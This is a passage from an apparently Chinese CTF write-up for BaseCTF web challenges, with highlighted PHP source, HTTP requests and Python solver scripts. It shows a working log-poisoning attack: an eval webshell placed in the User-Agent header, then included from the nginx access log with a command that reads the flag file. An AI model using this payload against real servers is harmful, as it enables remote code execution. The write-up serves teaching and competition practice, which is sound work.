</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$Datch</span><span class=p>,</span> <span class=nv>$char</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$is_valid</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$is_valid</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$invalid_patterns</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;php://&#39;</span><span class=p>,</span> <span class=s1>&#39;http://&#39;</span><span class=p>,</span> <span class=s1>&#39;https://&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp://&#39;</span><span class=p>,</span> <span class=s1>&#39;file://&#39;</span> <span class=p>,</span> <span class=s1>&#39;data://&#39;</span><span class=p>,</span> <span class=s1>&#39;gopher://&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$invalid_patterns</span> <span class=k>as</span> <span class=nv>$pattern</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$Datch</span><span class=p>,</span> <span class=nv>$pattern</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;此路不通换条路试试?&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>include</span><span class=p>(</span><span class=nv>$Datch</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;文件名不合规 请重试&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>日志文件没有被ban直接包含即可，但是有个小小的疑问</p><p>为啥要hello world的时候不能写data协议呢，这个又没有过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>Request</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>POST</span> <span class=o>/</span><span class=err>?</span><span class=n>a</span><span class=o>=</span><span class=n>echo</span><span class=o>%</span><span class=mi>20</span><span class=err>`</span><span class=n>tac</span><span class=o>%</span><span class=mi>20</span><span class=o>/</span><span class=n>f</span><span class=o>*</span><span class=err>`</span><span class=p>;</span> <span class=n>HTTP</span><span class=o>/</span><span class=mf>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=p>:</span> <span class=n>challenge</span><span class=o>.</span><span class=n>basectf</span><span class=o>.</span><span class=n>fun</span><span class=p>:</span><span class=mi>39591</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Length</span><span class=p>:</span> <span class=mi>62</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=p>:</span> <span class=n>no</span><span class=o>-</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache</span><span class=o>-</span><span class=ne>Control</span><span class=p>:</span> <span class=n>no</span><span class=o>-</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade</span><span class=o>-</span><span class=n>Insecure</span><span class=o>-</span><span class=n>Requests</span><span class=p>:</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>challenge</span><span class=o>.</span><span class=n>basectf</span><span class=o>.</span><span class=n>fun</span><span class=p>:</span><span class=mi>39591</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>application</span><span class=o>/</span><span class=n>x</span><span class=o>-</span><span class=n>www</span><span class=o>-</span><span class=n>form</span><span class=o>-</span><span class=n>urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>Agent</span><span class=p>:</span> <span class=n>Mozilla</span><span class=o>/</span><span class=mf>5.0</span> <span class=p>(</span><span class=n>Windows</span> <span class=n>NT</span> <span class=mf>10.0</span><span class=p>;</span> <span class=n>Win64</span><span class=p>;</span> <span class=n>x64</span><span class=p>)</span> <span class=n>AppleWebKit</span><span class=o>/</span><span class=mf>537.36</span> <span class=p>(</span><span class=n>KHTML</span><span class=p>,</span> <span class=n>like</span> <span class=n>Gecko</span><span class=p>)</span> <span class=n>Chrome</span><span class=o>/</span><span class=mf>128.0</span><span class=o>.</span><span class=mf>0.0</span> <span class=n>Safari</span><span class=o>/</span><span class=mf>537.36</span><span class=p>;</span><span class=o>&lt;</span><span class=err>?</span><span class=o>=</span><span class=n>eval</span><span class=p>(</span><span class=o>$</span><span class=n>_GET</span><span class=p>[</span><span class=n>a</span><span class=p>]);</span><span class=err>?</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=p>:</span> <span class=n>text</span><span class=o>/</span><span class=n>html</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xhtml</span><span class=o>+</span><span class=n>xml</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>xml</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.9</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>avif</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>webp</span><span class=p>,</span><span class=n>image</span><span class=o>/</span><span class=n>apng</span><span class=p>,</span><span class=o>*/*</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.8</span><span class=p>,</span><span class=n>application</span><span class=o>/</span><span class=n>signed</span><span class=o>-</span><span class=n>exchange</span><span class=p>;</span><span class=n>v</span><span class=o>=</span><span class=n>b3</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.7</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>challenge</span><span class=o>.</span><span class=n>basectf</span><span class=o>.</span><span class=n>fun</span><span class=p>:</span><span class=mi>39591</span><span class=o>/</span><span class=err>?</span><span class=n>a</span><span class=o>=</span><span class=n>echo</span><span class=o>%</span><span class=mi>20</span><span class=err>`</span><span class=n>tac</span><span class=o>%</span><span class=mi>20</span><span class=o>/</span><span class=n>f</span><span class=o>*</span><span class=err>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Encoding</span><span class=p>:</span> <span class=n>gzip</span><span class=p>,</span> <span class=n>deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Language</span><span class=p>:</span> <span class=n>zh</span><span class=o>-</span><span class=n>CN</span><span class=p>,</span><span class=n>zh</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.9</span><span class=p>,</span><span class=n>en</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=p>:</span> <span class=n>PHPSESSID</span><span class=o>=</span><span class=mi>9</span><span class=n>c14647va91fmsku06lsevlmij</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=p>:</span> <span class=n>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>incompetent</span><span class=o>=</span><span class=n>HelloWorld</span><span class=o>&amp;</span><span class=n>Datch</span><span class=o>=%</span><span class=mi>2</span><span class=n>Fvar</span><span class=o>%</span><span class=mi>2</span><span class=n>Flog</span><span class=o>%</span><span class=mi>2</span><span class=n>Fnginx</span><span class=o>%</span><span class=mi>2</span><span class=n>Faccess</span><span class=o>.</span><span class=n>log</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=week3-玩原神玩的>[Week3] 玩原神玩的</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>sizeof</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;len&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$array</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>ys_open</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;tip&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>die</span><span class=p>(</span><span class=s2>&#34;错了！就你还想玩原神？❌❌❌&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>ys_open</span><span class=p>(</span><span class=nv>$tip</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$tip</span> <span class=o>!=</span> <span class=s2>&#34;我要玩原神&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;我不管，我要玩原神！😭😭😭&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nx>dumpFlag</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>dumpFlag</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>])</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;可恶的QQ人！😡😡😡&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>][</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nv>$b</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;m&#39;</span><span class=p>][</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$b</span><span class=p>)</span> <span class=o>||</span> <span class=nv>$a</span> <span class=o>!=</span> <span class=s2>&#34;100%&#34;</span> <span class=o>||</span> <span class=nv>$b</span> <span class=o>!=</span> <span class=s2>&#34;love100%&#34;</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;某站崩了？肯定是某忽悠干的！😡😡😡&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>include</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>$flag</span><span class=p>[]</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nv>$ii</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span><span class=nv>$ii</span> <span class=o>&lt;</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$array</span><span class=p>);</span><span class=nv>$ii</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$flag</span><span class=p>[</span><span class=nv>$ii</span><span class=p>]</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$array</span><span class=p>[</span><span class=nv>$ii</span><span class=p>])</span> <span class=o>^</span> <span class=nv>$ii</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=nx>错了！就你还想玩原神？❌❌❌</span>
</span></span></code></pre></td></tr></table></div></div><p>挨个来，首先</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>sizeof</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;len&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=nx>sizeof</span><span class=p>(</span><span class=nv>$array</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>ys_open</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;tip&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里我是直接尝试的字符串，但是后面想想字符串的长度和数组的长度进行比较?，不太科学，所以爆破一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>urlencode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 目标 URL</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://challenge.basectf.fun:41347/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 需要传递的 headers（如果需要的话，添加 Cookies 或其他 headers）</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 初始化 data</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 循环递增 len[] 键值对</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>101</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 增加新的 len[i] 参数</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=p>[</span><span class=sa>f</span><span class=s1>&#39;len[</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>]&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>  <span class=c1># 你可以根据需求修改每个键值对的值</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 将 data 转换为 URL 编码格式的字符串</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>urlencode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 打印最终的 payload</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;当前 payload: </span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 发送 POST 请求</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 检查服务器的响应内容</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;&lt;/code&gt;我不管，我要玩原神！😭😭😭&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;找到匹配长度: </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>然后找到是45，那么看看后面发现有点小坑就是<code>%</code>的编码问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /?tip=%E6%88%91%E8%A6%81%E7%8E%A9%E5%8E%9F%E7%A5%9E HTTP/1.1
</span></span><span class=line><span class=cl>Host: challenge.basectf.fun:45702
</span></span><span class=line><span class=cl>Content-Length: 677
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://challenge.basectf.fun:41347
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://challenge.basectf.fun:41347/
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>len%5B0%5D=1&amp;len%5B1%5D=1&amp;len%5B2%5D=1&amp;len%5B3%5D=1&amp;len%5B4%5D=1&amp;len%5B5%5D=1&amp;len%5B6%5D=1&amp;len%5B7%5D=1&amp;len%5B8%5D=1&amp;len%5B9%5D=1&amp;len%5B10%5D=1&amp;len%5B11%5D=1&amp;len%5B12%5D=1&amp;len%5B13%5D=1&amp;len%5B14%5D=1&amp;len%5B15%5D=1&amp;len%5B16%5D=1&amp;len%5B17%5D=1&amp;len%5B18%5D=1&amp;len%5B19%5D=1&amp;len%5B20%5D=1&amp;len%5B21%5D=1&amp;len%5B22%5D=1&amp;len%5B23%5D=1&amp;len%5B24%5D=1&amp;len%5B25%5D=1&amp;len%5B26%5D=1&amp;len%5B27%5D=1&amp;len%5B28%5D=1&amp;len%5B29%5D=1&amp;len%5B30%5D=1&amp;len%5B31%5D=1&amp;len%5B32%5D=1&amp;len%5B33%5D=1&amp;len%5B34%5D=1&amp;len%5B35%5D=1&amp;len%5B36%5D=1&amp;len%5B37%5D=1&amp;len%5B38%5D=1&amp;len%5B39%5D=1&amp;len%5B40%5D=1&amp;len%5B41%5D=1&amp;len%5B42%5D=1&amp;len%5B43%5D=1&amp;len%5B44%5D=1&amp;m[]=100%25&amp;m[]=love100%2530bd7ce7de206924302499f197c7a966
</span></span></code></pre></td></tr></table></div></div><p>拿到了每个字符的<code>md5</code>，这里爆破一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>hashes</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;3295c76acbf4caaed33c36b1b5fc2cb1&#34;</span><span class=p>,</span><span class=s2>&#34;26657d5ff9020d2abefe558796b99584&#34;</span><span class=p>,</span><span class=s2>&#34;73278a4a86960eeb576a8fd4c9ec6997&#34;</span><span class=p>,</span><span class=s2>&#34;ec8956637a99787bd197eacd77acce5e&#34;</span><span class=p>,</span><span class=s2>&#34;e2c420d928d4bf8ce0ff2ec19b371514&#34;</span><span class=p>,</span><span class=s2>&#34;43ec517d68b6edd3015b3edc9a11367b&#34;</span><span class=p>,</span><span class=s2>&#34;ea5d2f1c4608232e07d3aa3d998e5135&#34;</span><span class=p>,</span><span class=s2>&#34;c8ffe9a587b126f152ed3d89a146b445&#34;</span><span class=p>,</span><span class=s2>&#34;f457c545a9ded88f18ecee47145a72c0&#34;</span><span class=p>,</span><span class=s2>&#34;66f041e16a60928b05a7e228a89c3799&#34;</span><span class=p>,</span><span class=s2>&#34;c0c7c76d30bd3dcaefc96f40275bdc0a&#34;</span><span class=p>,</span><span class=s2>&#34;7f39f8317fbdb1988ef4c628eba02591&#34;</span><span class=p>,</span><span class=s2>&#34;f0935e4cd5920aa6c7c996a5ee53a70f&#34;</span><span class=p>,</span><span class=s2>&#34;65b9eea6e1cc6bb9f0cd2a47751a186f&#34;</span><span class=p>,</span><span class=s2>&#34;072b030ba126b2f4b2374f342be9ed44&#34;</span><span class=p>,</span><span class=s2>&#34;a97da629b098b75c294dffdc3e463904&#34;</span><span class=p>,</span><span class=s2>&#34;7f39f8317fbdb1988ef4c628eba02591&#34;</span><span class=p>,</span><span class=s2>&#34;d67d8ab4f4c10bf22aa353e27879133c&#34;</span><span class=p>,</span><span class=s2>&#34;19ca14e7ea6328a42e0eb13d585e4c22&#34;</span><span class=p>,</span><span class=s2>&#34;a1d0c6e83f027327d8461063f4ac58a6&#34;</span><span class=p>,</span><span class=s2>&#34;d67d8ab4f4c10bf22aa353e27879133c&#34;</span><span class=p>,</span><span class=s2>&#34;9f61408e3afb633e50cdf1b20de6f466&#34;</span><span class=p>,</span><span class=s2>&#34;e369853df766fa44e1ed0ff613f563bd&#34;</span><span class=p>,</span><span class=s2>&#34;d9d4f495e875a2e075a1a4a6e1b9770f&#34;</span><span class=p>,</span><span class=s2>&#34;d9d4f495e875a2e075a1a4a6e1b9770f&#34;</span><span class=p>,</span><span class=s2>&#34;67c6a1e7ce56d3d6fa748ab6d9af3fd7&#34;</span><span class=p>,</span><span class=s2>&#34;b53b3a3d6ab90ce0268229151c9bde11&#34;</span><span class=p>,</span><span class=s2>&#34;4c56ff4ce4aaf9573aa5dff913df997a&#34;</span><span class=p>,</span><span class=s2>&#34;d9d4f495e875a2e075a1a4a6e1b9770f&#34;</span><span class=p>,</span><span class=s2>&#34;3416a75f4cea9109507cacd8e2f2aefc&#34;</span><span class=p>,</span><span class=s2>&#34;a5771bce93e200c36f7cd9dfd0e5deaa&#34;</span><span class=p>,</span><span class=s2>&#34;c0c7c76d30bd3dcaefc96f40275bdc0a&#34;</span><span class=p>,</span><span class=s2>&#34;1f0e3dad99908345f7439f8ffabdffc4&#34;</span><span class=p>,</span><span class=s2>&#34;3c59dc048e8850243be8079a5c74d079&#34;</span><span class=p>,</span><span class=s2>&#34;ea5d2f1c4608232e07d3aa3d998e5135&#34;</span><span class=p>,</span><span class=s2>&#34;98f13708210194c475687be6106a3b84&#34;</span><span class=p>,</span><span class=s2>&#34;c74d97b01eae257e44aa9d5bade97baf&#34;</span><span class=p>,</span><span class=s2>&#34;3c59dc048e8850243be8079a5c74d079&#34;</span><span class=p>,</span><span class=s2>&#34;14bfa6bb14875e45bba028a21ed38046&#34;</span><span class=p>,</span><span class=s2>&#34;14bfa6bb14875e45bba028a21ed38046&#34;</span><span class=p>,</span><span class=s2>&#34;1ff1de774005f8da13f42943881c655f&#34;</span><span class=p>,</span><span 